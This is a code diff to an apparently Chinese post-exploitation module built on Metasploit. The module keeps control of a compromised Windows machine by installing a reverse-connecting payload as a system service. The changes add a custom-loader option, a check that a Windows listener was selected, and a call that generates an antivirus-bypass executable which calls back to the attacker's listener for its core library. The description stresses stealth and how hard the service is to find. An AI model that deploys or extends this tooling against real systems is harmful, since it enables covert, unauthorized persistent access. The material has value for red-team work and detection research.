@@ -11,6 +11,7 @@ class PostModule(PostMSFRawModule):
     DESC = "模块通过将上传的Payload文件注册为系统服务的方式进行持久化控制.\n" \
            "此模块需要Session系统权限或管理员权限.\n" \
            "服务持久化虽然在写入时无法免杀,但是成功写入口由于排查困难,隐蔽效果好.\n" \
+           "当使用自定义loader时,需要为服务类型的exe.\n" \
            "使用模块时请勿关闭对应监听,Loader启动需要回连监听获取核心库文件."
     REQUIRE_SESSION = True
     MODULETYPE = TAG2CH.Persistence
@@ -22,6 +23,7 @@ class PostModule(PostMSFRawModule):
     REFERENCES = ["https://attack.mitre.org/techniques/T1050/"]
     OPTIONS = register_options([
         OptionHander(),
+        OptionFileEnum(ext=['exe', 'EXE'], required=False),
         OptionCacheHanderConfig(),
 
     ])
@@ -46,10 +48,17 @@ class PostModule(PostMSFRawModule):
         else:
             return False, "当前Session必须拥有系统权限或管理员权限"
 
+        if 'windows' not in self.get_handler_payload().lower():
+            return False, "选择handler错误,请选择windows平台的监听"
         self.set_payload_by_handler()
-        if 'windows' not in self.opts.get('PAYLOAD').lower():
-            return False, "选择handler错误,建议选择windows平台的handler"
-        exe_filepath = self.generate_bypass_exe_file(template="REVERSE_HEX_AS_SERVICE")
+
+        filepath = self.get_fileoption_filepath(msf=True)
+        if filepath is None:  # 根据监听进行持久化
+            exe_filepath = self.generate_bypass_exe_file(template="REVERSE_HEX_BASE")
+        else:
+            Notice.send_info("使用自定义的loader进行持久化")
+            exe_filepath = filepath
+
         self.set_msf_option("EXE::Custom", exe_filepath)
         return True, None
 
